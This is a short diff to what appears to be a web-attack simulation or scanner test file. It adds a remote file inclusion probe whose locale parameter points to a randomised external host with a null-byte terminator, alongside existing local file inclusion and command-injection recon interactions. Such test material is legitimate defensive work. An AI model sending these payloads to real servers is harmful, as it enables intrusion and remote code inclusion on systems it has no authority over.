@@ -158,6 +158,7 @@ class dynamic:
     )
     faq_success = Interaction(uri="faq", query="locale=english")
     faq_lfi = Interaction(uri="faq", query="locale=__rand_str__")
+    faq_rfi = Interaction(uri="faq", query="locale=http://__rand_str__.io:__rand_int__/__rand_str____app_extension__.txt%00")
     sticky_page_500 = Interaction(uri="__rand_sticky_str__", status_code=500)
     cmd_injection_on_sticky_page_recon = Interaction(
         uri="__rand_sticky_str__", query="cmd=__rand_cmd_recon__"
